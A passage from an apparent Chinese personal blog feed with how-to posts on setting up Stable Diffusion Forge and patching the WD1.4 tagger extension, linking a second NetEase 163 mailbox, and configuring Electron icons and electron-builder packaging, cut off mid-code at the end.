alt=""></p><p>进入<code>版本管理</code>，点击右侧<code>切换分支</code>按钮，选择相应的远程地址。一般我们选择原版<code>lllyasviel/stable-diffusion-webui-forge</code>选项，然后点击下拉菜单中的<code>切换分支</code>按钮，在弹窗中确认即可。（你看到的修改后的远端地址可能是一个 GitCode 地址，这是启动器自动设置的，无需担心是不是配置出错，把它理解为国内加速地址就行了）。</p><p>完成后点击<code>一键更新</code>，自动同步最新版本。之后每次启动都建议来这里检查一下，实际上是代替了 Forge 官方一键包里面的更新脚本。</p><p><img src="https://s2.loli.net/2024/11/05/OI16XPAZj97DtHY.png" alt=""></p><p><strong>先别动 extensions</strong>，因为有些在 SD-WebUI 中能用的插件在 Forge 中不一定兼容。完成后回到<code>一键启动</code>，等待程序初始化。期间可能会连接到未被镜像的国外地址，可能会因为网络问题而出错，这里请自行想办法解决，<s>有“魔法”就挂上，有加速器就用，提示 SSL 挂了什么的就关，多试几次、多重启几下，总会成功的</s>。一切完成后，如果配置无误，则启动器会自动打开浏览器访问地址（默认为<code>http://127.0.0.1:7860</code>），若组件加载正常且可以正常使用，则表明基本配置已经设置完成。</p><h3 id="设置">设置</h3><p>此节在 Forge Webui 中操作。大多数设置与 SD-Webui 相同或相似，使用过 SD-Webui 的，有些配置方法可以直接迁移过来。</p><h4 id="语言">语言</h4><p>待 Forge Webui 加载完成后，在选项卡找到<code>Settings</code>，点击后在左侧菜单栏找到<code>User interface</code>并点击。回到上方，将<code>Localization</code>设置为<code>zh-Hans (Stable)</code>。没有加载出来可以点击右侧的刷新图标后尝试。设置完后点击<code>Apply settings</code>按钮，然后再点击<code>Reload UI</code>重载 UI 应用更改。</p><p>如果没有显示，或许可以尝试在<code>Extensions</code>选项卡-&gt;<code>Install from URL</code>-&gt;<code>URL for extension's git repository</code>中填写以安装这个插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hanamizuki-ai/stable-diffusion-webui-localization-zh_Hans</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/05/kgMO1x4AE7bLl6u.png" alt=""></p><h4 id="插件">插件</h4><p>建议去 Forge 的 Webui 界面里下载，而不是直接将原来 SD-Webui 的 extensions 文件夹里的东西直接复制过来，否则部分插件可能会因为兼容性问题而无法正常加载。</p><p>在 webui 的 extensions 选项卡中选择 Install from URL（从网址安装），在 URL for extension’s git repository 中填写相应的仓库地址，等待安装。期间如果出现网络不佳等问题，请自行解决。</p><p><img src="https://s2.loli.net/2024/11/05/uOLZwYVcB6FaD7d.png" alt=""></p><p>推荐插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/DominikDoom/a1111-sd-webui-tagcomplete</span><br><span class="line">https://github.com/Bing-su/adetailer</span><br><span class="line">https://github.com/layerdiffusion/sd-forge-layerdiffusion</span><br><span class="line">https://github.com/huchenlei/sd-webui-openpose-editor</span><br><span class="line">https://github.com/Physton/sd-webui-prompt-all-in-one</span><br><span class="line">https://github.com/Akegarasu/sd-webui-wd14-tagger</span><br><span class="line">https://github.com/hanamizuki-ai/stable-diffusion-webui-localization-zh_Hans</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一键分析 Stable Diffusion 图像提示词：WD1.4 标签器安装与使用</title>
      <link href="/posts/1085553840/"/>
      <url>/posts/1085553840/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中间有好一段时间没有用 SD 了，WD1.4 标签器更是很久未用，以致更新后都没注意到它没加载出来。查阅资料，进行修复，以此文记录。</p><hr><p>Stable Diffusion 因为其开源的性质，在庞大的社区支持下，它已经成为一个强大的图像生成工具；随着图形化界面、民间的支持文档、不同模型的开发，其上手难度得到了进一步降低。</p><p>自打上手 AI 作图且基础配置完成后，“灵感”成了我最大的限制之一——准确来讲，是“如何用语言描述自己的灵感”。看着别人画出来的画如此好看，自己写的那提示词出的图马上就“不忍直视”了。而且对于 SD-WebUI，它的设置项很多，可控制的东西也很多，但只要稍微有点偏差（尤其是提示词一块），出图可能就截然不同了。“他到底用了什么 Tag？”</p><p>当然，用 SD 直接出的图一般是可以通过相应的工具解析出来，但如果这张图不是 SD 算法出的，又或是经过修改了呢？</p><p>WD14 是一个基于 SD-Webui 的标签插件（实际上应称之为“扩展”），也有 ComfyUI 版本。这个插件可以使用各种模型（如 DeepDanbooru）从已有的单个或多个图像文件中反推出来可能符合的 tag 标签（因此还是需要进行适当调整），还可以看到不同 tag 的权重。通过这些关键词可以便于我们了解图像的构成，并模仿着生成类似风格的图像，适合那些希望通过学习他人作品来提升自己创作水平的人。</p><p>本文面向使用 SD-WebUI 的用户。</p><h2 id="安装">安装</h2><p>访问 <a href="https://github.com/toriato/stable-diffusion-webui-wd14-tagger" rel="external nofollow noreferrer">https://github.com/toriato/stable-diffusion-webui-wd14-tagger</a> 下载插件（虽然这个插件比较知名，但因为作者的身体原因，该仓库已经很久没有维护了，如果使用了 1.6.0 以上版本的 stable diffusion 以及相应的 SD-WebUI，那么直接使用该插件大概率是要报错的，后面会讲解决方法）。</p><p>嫌麻烦的可以直接试试它的第三方维护版：</p><ul><li><a href="https://github.com/picobyte/stable-diffusion-webui-wd14-tagger" rel="external nofollow noreferrer">picobyte/stable-diffusion-webui-wd14-tagger</a></li><li><a href="https://github.com/akegarasu/sd-webui-wd14-tagger" rel="external nofollow noreferrer">akegarasu/sd-webui-wd14-tagger</a></li></ul><p><strong>建议直接安装这些维护分支的版本</strong>，它们已经解决了上述的因 SD-WebUI 主程序源码变动导致的报错，并进行了一定的优化。如果你选择安装上述的第三方维护分支的插件，那么后面修改文件一节可以直接跳过。</p><p>下文的安装方法选择其一即可（此处保留原版插件的地址，如有需要请自行调整）：</p><h3 id="Git-或手动下载解压">Git 或手动下载解压</h3><p>直接在 GitHub 点击绿色<code>Code</code>按钮，在<code>Local</code>选项卡中点击<code>Download ZIP</code>进行下载（自备加速器，例如 Watt Toolkit。顺带一提，目前新的测试版 Watt Toolkit 的加速脚本支持加速 HuggingFace 了，好耶、~）。</p><p>之后将插件解压到 SD-WebUI 中<code>extensions</code>目录下（带文件夹）（不会解压的请自行百度）。解压完后，该目录下应有一个名为<code>stable-diffusion-webui-wd14-tagger</code>的文件夹，里面是一些 Python 脚本和其他配置文件（夹）。</p><p>或者直接使用 git clone，在 SD-WebUI 中<code>extensions</code>目录下打开 Git Bash，执行克隆命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/toriato/stable-diffusion-webui-wd14-tagger.git</span><br></pre></td></tr></table></figure><p>等待执行，完成后重启 UI，查看插件是否被正常加载和显示。</p><h3 id="通过-SD-WebUI-安装">通过 SD-WebUI 安装</h3><p>在前面那个下载地址中点击绿色<code>Code</code>按钮，点击<code>Local</code>选项卡中的<code>Clone</code>处<code>HTTPS</code>选项卡下方的类似于<code>复制</code>的按钮，复制 Git 链接。</p><p>之后启动 SD-WebUI，点击<code>设置</code>选项卡，点击<code>从网址安装</code>，将前面的 Git 链接填入<code>插件的 git 仓库网址</code>下方的文本框，点击<code>安装</code>后等待执行。若整个安装过程无误，则在完成后重启面板之后，顶部选项卡会出现<code>WD1.4</code>之类的字样。</p><p><img src="https://s2.loli.net/2024/10/03/hXG8IW61dfSTpHz.png" alt=""></p><p>（我已经安装过该插件，因此顶部选项卡中直接就有该插件的标签）</p><p>如果你使用了秋葉 aaaki 的绘世启动器，那么你可以在启动器的<code>版本管理</code>-&gt;<code>安装新插件</code>中填写上面的 URL 进行安装，此处不再赘述。</p><h2 id="修改文件">修改文件</h2><blockquote><p>如果你安装了原版的插件，需要修改插件的代码。前文提到的那两个分支插件已经解决了这个问题，如果你安装的是它们，则直接跳过本节。</p></blockquote><p>如你所见，主分支的 stable-diffusion-webui-wd14-tagger 插件有些文件最后一次更新是两年前。由于 WebUI 期间调整了代码，而这部分代码影响了 wd14 标签器的运行，从而导致报错。如果按照上面的流程安装了原版的标签器插件，那么现在还需要修改该插件中的两个文件。</p><p>如果你的 SD-WebUI 根目录为<code>SD-WebUI</code>，那么你需要进入<code>SD-WebUI\extensions\stable-diffusion-webui-wd14-tagger</code>目录，找到<code>preload.py</code>文件，作出如下修改（减号后面的是删去的，加号后面的是添加的；实际修改时删除前面的加号和减号，不要补空格。下同）：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line"><span class="deletion">-from modules.shared import models_path</span></span><br><span class="line"><span class="deletion">-default_ddp_path = Path(models_path, &#x27;deepdanbooru&#x27;)</span></span><br><span class="line"><span class="addition">+from modules import paths</span></span><br><span class="line"><span class="addition">+default_ddp_path = Path(paths.models_path, &#x27;deepdanbooru&#x27;) </span></span><br><span class="line"></span><br><span class="line"># ... 省略代码</span><br></pre></td></tr></table></figure><p>进入<code>SD-WebUI\extensions\stable-diffusion-webui-wd14-tagger\tagger</code>目录，找到<code>ui.py</code>文件，作出如下修改：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ... 省略代码</span><br><span class="line">from collections import OrderedDict</span><br><span class="line">from pathlib import Path</span><br><span class="line">from glob import glob</span><br><span class="line">from PIL import Image, UnidentifiedImageError</span><br><span class="line"></span><br><span class="line"><span class="deletion">-from webui import wrap_gradio_gpu_call</span></span><br><span class="line"><span class="addition">+from modules.call_queue import wrap_gradio_gpu_call </span></span><br><span class="line"></span><br><span class="line">from modules import ui</span><br><span class="line">from modules import generation_parameters_copypaste as parameters_copypaste</span><br><span class="line"># ... 省略代码</span><br></pre></td></tr></table></figure><h2 id="下载模型">下载模型</h2><p>启用插件后，在首次加载标签器插件时会自动从 HuggingFace 下载缺失的模型。有魔法条件的（例如前面的 Watt Toolkit 的最新测试版本，或是其他的加速器）可以跳过本节了，把相应的工具启用，等待模型下载完成。</p><p>没条件的可以“曲线救国”，手动去 HuggingFace 镜像站（例如 hf-mirror）下载模型后，通过本地的方式引入模型。hf-mirror 的项目仓库为：<a href="https://hf-mirror.com/SmilingWolf/wd-v1-4-vit-tagger/tree/main" rel="external nofollow noreferrer"><br>wd-v1-4-vit-tagger</a>，你需要下载这两个文件：</p><ul><li>model.onnx</li><li>selected_tags.csv</li></ul><p>下载完成后，在 SD-WebUI 中找个顺眼的地方创建个目录，将这两个文件放进去（例如<code>SD-WebUI\extensions\wd-v1-4-vit-tagger\</code>。实际路径可以自己设置，此处演示为区分而沿用 HF 上仓库名称）。之后编辑<code>SD-WebUI\extensions\stable-diffusion-webui-wd14-tagger\tagger</code>目录下的<code>interrogator.py</code>文件，找到<code>def download</code>，修改路径为本地绝对路径（假设前面那个<code>SD-WebUI</code>目录在 E 盘根目录下）：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    # ... 省略代码</span><br><span class="line">    def download(self) -&gt; Tuple[os.PathLike, os.PathLike]:</span><br><span class="line">        print(f&quot;Loading &#123;self.name&#125; model file from &#123;self.kwargs[&#x27;repo_id&#x27;]&#125;&quot;)</span><br><span class="line"></span><br><span class="line"><span class="deletion">-        model_path = Path(hf_hub_download(</span></span><br><span class="line"><span class="deletion">-            **self.kwargs, filename=self.model_path))</span></span><br><span class="line"><span class="deletion">-        tags_path = Path(hf_hub_download(</span></span><br><span class="line"><span class="deletion">-            **self.kwargs, filename=self.tags_path))</span></span><br><span class="line"><span class="addition">+        model_path = &quot;E:\SD-WebUI\extensions\stable-diffusion-webui-wd14-tagger\tagger\model.onnx&quot;</span></span><br><span class="line"><span class="addition">+        tags_path = &quot;E:\SD-WebUI\extensions\stable-diffusion-webui-wd14-tagger\tagger\selected_tags.csv&quot;</span></span><br><span class="line">        return model_path, tags_path</span><br><span class="line">    # ... 省略代码</span><br></pre></td></tr></table></figure><p>保存并重启 UI，若配置无误，则标签器插件可正常使用。</p><h2 id="使用">使用</h2><p>这里以一张 Pixabay 中的图片作为示例：</p><p><img src="https://s2.loli.net/2024/10/03/gcd4WFIBntb5Gyu.png" alt=""></p><p>（截图是汉化后的 WebUI 中的截图，英文版可能需要自己对应，英文原版的选项卡的名称也不一定是 WD1.4 标签器）</p><p>在 WD1.4 标签器选项卡中选择想要分析的图像并上传，之后选择一个反推模型（一般使用 wd14-vit-v2.git），其他的保持默认即可。之后点击 Interrogate 按钮，插件会自动分析图像并生成一组提示词（速度因设备配置不同而异），完成后右侧会出现可能用到的 tag 及权重。</p><p>另外，用完后记得点击按钮<strong>卸载所有反推模型</strong>，避免出现一些意想不到的问题。</p><p>下面它的一些常用设置项：</p><table><thead><tr><th>项目</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td>预设</td><td>使用已经配置好的参数组合，快速选择并应用它们来简化操作</td><td>常用的标签提取任务，节省时间</td></tr><tr><td>反推</td><td>从现有的标签中推断出可能的提示词</td><td>当你有一组标签但不确定如何生成相应的提示词时，可以使用反推功能</td></tr><tr><td>卸载反推所有模型</td><td>卸载所有加载的反推模型，以释放内存资源</td><td>在内存资源紧张时，或不再需要反推功能时</td></tr><tr><td>阈值</td><td>设置标签提取的敏感度，决定哪些标签会被提取出来</td><td>根据需要调整阈值，可以控制提取标签的数量和精度</td></tr><tr><td>附件标签</td><td>用于手动添加额外的标签，以补充自动提取的结果</td><td>当自动提取的标签不够全面或不准确时，可以手动添加补充</td></tr><tr><td>排除标签</td><td>指定不希望出现在结果中的标签</td><td>当某些标签不相关或不需要时，可以通过排除标签功能将其过滤掉</td></tr></tbody></table><h2 id="后记">后记</h2><p><strong>参考</strong></p><blockquote><p><a href="https://blog.csdn.net/u013113491/article/details/132844040" rel="external nofollow noreferrer">解决 stable diffusion webui1.6 wd1.4 tagger 加载失败的问题</a></p></blockquote><p><strong>插件故障</strong></p><p>如果发现标签器无法正常使用，控制台出现报错，需要自行尝试解决。请尝试根据报错内容进行简单分析。</p><ul><li>如果判断出是插件的问题，可以在本文后段查阅解决方案；</li><li>如果是首次使用，未下载反推模型，可能需要自行解决网络问题；</li><li>如果判断是 onnxruntime 的问题，可以尝试重装该 python 组件；</li><li>如果你使用了 N 卡，建议考虑下 PyTorch 和 CUDA 版本的对应关系，也留心下 onnxruntime 支持的 CUDA 版本与当前 CUDA 版本是否对应；</li><li>……</li></ul>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易邮箱添加（迁移）其他邮箱的方法</title>
      <link href="/posts/3573389076/"/>
      <url>/posts/3573389076/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>手中有几个 163 邮箱的账户，有时需要查看其他邮箱的邮件，来回切换有点繁琐。想起来网易邮箱有个叫“关联多个邮箱”的功能，结果……</p><blockquote><p>您好，多账号关联功能已于 2021 年 6 月 30 日下线，下线后无法再使用相关功能，建议您使用邮箱大师来管理多个邮箱。</p></blockquote><p>那就用它这个“账号与邮箱中心”曲线救国一下，虽然这样做有时需要去设置里点“收取所有邮箱邮件”。</p><hr><p>这里我使用两个 163 邮箱作为演示。登录被迁移的邮箱，点击<code>设置</code>-&gt;<code>常规设置</code>-&gt;<code>POP3/SMTP/IMAP</code>。由于 163 邮箱的一键迁移是通过 POP3 自动收取以管理其他邮箱的邮件的，因此需要将此处的<code>POP3/SMTP 服务</code>设置为<code>开启</code>，其他的地方按需设置。（如果不是 163 邮箱，配置可能不相同，请自行参考你自己的邮箱的官方说明）。</p><p>这里会展示一次授权码（后面会用到），请妥善保管并注意失效时间。</p><p><img src="https://s2.loli.net/2024/11/05/EmOdDFZ6rJjTo4e.png" alt=""></p><p>在主邮箱邮箱账户中点击<code>设置</code>-&gt;<code>常规设置</code>-&gt;<code>账号与邮箱中心</code>，在<code>邮箱中心</code>点击<code>立即创建</code>（如果你不是首次添加其他邮箱，找到这一块底部<code>添加其他邮箱(一键迁移)</code>也可以）。</p><p><img src="https://s2.loli.net/2024/11/05/FIf6OTlwAMKcCeb.png" alt=""></p><p>接下来是填写其他邮箱账号、对应的邮箱密码之类的，请按需设置。值得注意的是，在以前网易邮箱添加网易邮箱时，输入邮箱的普通登陆密码即可，现在则不行：</p><blockquote><p>对方服务器拒绝、或用户名密码不正确,请重新验证</p></blockquote><p>现在需要在主邮箱的“对应的邮箱密码”表单中输入上文在被迁移的邮箱中获取的授权码，之后可以正常添加并管理其他邮箱的邮件（其他邮箱不确定是否也需要如是操作）。</p><p>随后点击<code>收取所有邮箱邮件</code>，等待提示，之后在首页左侧的<code>邮件中心</code>可以看到被迁移的邮箱的邮件。</p><p>如果需要修改收取范围等设置项，可以在<code>设置</code>-&gt;<code>常规设置</code>-&gt;<code>账号与邮箱中心</code>找到对应邮箱，点击<code>修改设置</code>即可。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 邮件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron实用设置</title>
      <link href="/posts/469643826/"/>
      <url>/posts/469643826/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>给文章调整了下结构，将两篇记录 Electron 打包工具的文章中的非必须功能整合到这里，方便查阅。</p><h2 id="左上角图标">左上角图标</h2><p>在项目根目录下创建<code>images</code>文件夹，其中包含<code>favicon.png</code>文件（256*256，128*128、64*64 都可以，如果后面执行报错则根据提示修改分辨率。图标大小不应过大，100kb 以内利于加载。但在实际使用时它可能会提示图片最小不小于 256*256。）。</p><p>在<code>main.js</code>中找到约第 5 行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">  <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">  <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">  <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">    <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>添加：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  const mainWindow = new BrowserWindow(&#123;</span><br><span class="line">    width: 800,</span><br><span class="line">    height: 600,</span><br><span class="line"><span class="addition">+    icon: path.join(__dirname,&#x27;/images/favicon.png&#x27;),</span></span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      preload: path.join(__dirname, &#x27;preload.js&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>似乎不需要在 package.json 中另行配置即可简单实现这个效果。此处修改是否生效，可通过开发模式启动项目进行检查，无需打包编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm electron .</span><br></pre></td></tr></table></figure><h2 id="去除顶部菜单栏">去除顶部菜单栏</h2><p>在<code>main.js</code>文件中约第 10 行找到如下代码并添加：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//省略。..</span><br><span class="line">function createWindow () &#123;</span><br><span class="line">  // Create the browser window.</span><br><span class="line">  const mainWindow = new BrowserWindow(&#123;</span><br><span class="line">    width: 800,</span><br><span class="line">    height: 600,</span><br><span class="line"><span class="addition">+    autoHideMenuBar: true,</span></span><br><span class="line">    icon: path.join(__dirname,&#x27;/images/icon.png&#x27;),</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      preload: path.join(__dirname, &#x27;preload.js&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  // and load the index.html of the app.</span><br><span class="line">  mainWindow.loadFile(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">  // Open the DevTools.</span><br><span class="line">  // mainWindow.webContents.openDevTools()</span><br><span class="line">&#125;</span><br><span class="line">//省略。..</span><br></pre></td></tr></table></figure><hr><p>以下操作在使用 electron-builder 时进行测试，其他构建工具效果未知。</p><h2 id="生成-electron-打包常用图标">生成 electron 打包常用图标</h2><p>在<code>【projectroot】</code>目录下打开终端，执行命令安装<code>electron-icon-builder</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install electron-icon-builder --D</span><br></pre></td></tr></table></figure><p>准备好你需要的图片。此处演示使用项目根目录下位于<code>【projectroot】/images/icon.png</code>的文件。</p><p>在<code>package.json</code>中上方<code>scripts</code>中添加命令，注意缩进与添加后倒数第二项 script 后方的逗号：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;electron-test&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;A minimal Electron application&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;main.js&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;electron .&quot;,</span><br><span class="line">    &quot;build&quot;: &quot; electron-builder --dir &quot;,</span><br><span class="line">    &quot;packwin&quot;: &quot; electron-builder --win --x64&quot;,</span><br><span class="line">    &quot;postinstall&quot;: &quot;electron-builder install-app-deps&quot;,</span><br><span class="line"><span class="addition">+    &quot;build-icon&quot;: &quot;electron-icon-builder --input=./images/icon.png --output=build --flatten&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  //省略内容。..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存后在<code>【projectroot】</code>目录下打开终端并执行命令以生成常用类型图标：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build-icon</span><br></pre></td></tr></table></figure><h2 id="信息修改与图标配置">信息修改与图标配置</h2><p>在<code>package.json</code>中与最前面<code>name</code>等配置项相同缩进，编写<code>build</code>配置项，用于控制 electron-builder 打包的应用的信息。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制粘贴时记得按照实际情况进行修改，并删除所有注释内容！</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A minimal Electron application&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  <span class="comment">// electron-builder 配置项</span></span><br><span class="line">    <span class="attr">&quot;productName&quot;</span><span class="punctuation">:</span><span class="string">&quot;program-name&quot;</span><span class="punctuation">,</span><span class="comment">//项目名，生成的 exe 文件名</span></span><br><span class="line">    <span class="attr">&quot;appId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.app.appid&quot;</span><span class="punctuation">,</span><span class="comment">//包名，可以自定义但最好保持格式。打包后不建议修改，否则系统会认为这是两个软件</span></span><br><span class="line">    <span class="attr">&quot;copyright&quot;</span><span class="punctuation">:</span><span class="string">&quot;Company2 Co. Ltd.&quot;</span><span class="punctuation">,</span><span class="comment">//版权信息</span></span><br><span class="line">    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/favicon.png&quot;</span><span class="punctuation">,</span><span class="comment">//图标配置，用于控制软件左上角、任务栏图标、exe 图标，可用 ico 或 png，其他没试。示例中指向文件为项目根目录下 images 文件夹中的 favicon.png</span></span><br><span class="line">    <span class="attr">&quot;directories&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="comment">// 输出文件夹，不配置则默认为项目文件夹中的 dist 目录。没有对应文件夹会自动创建</span></span><br><span class="line">      <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="comment">// windows 相关的配置</span></span><br><span class="line">    <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">      <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/icon.ico&quot;</span><span class="comment">//图标路径，此处为项目根目录中 images 文件夹中的 icon.ico 文件。建议 256*256 这样的大小或更大。注意，Windows 图标只能识别 ico 文件（但使用 png 貌似也没什么问题，我自己用 ico 时终端经常报错，不知什么原因）</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// Mac OS 相关的配置</span></span><br><span class="line">    <span class="attr">&quot;mac&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/icon.icns&quot;</span><span class="comment">//同上，注意 MacOS 图标只能识别 icns 文件</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这样保存完后再执行上一节的打包命令即可生效。Windows 系统由于图标缓存的原因可能看不到修改（若配置无误则实际已生效），可尝试清理缓存、拖动文件到其他目录等方式进行试验。</p><p>左上角图标、任务栏图标、执行程序图标均由<code>package.json</code>中配置项控制。（保险起见在<code>main.js</code>中也进行图标配置）执行不同的打包命令则会根据配置进行，例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 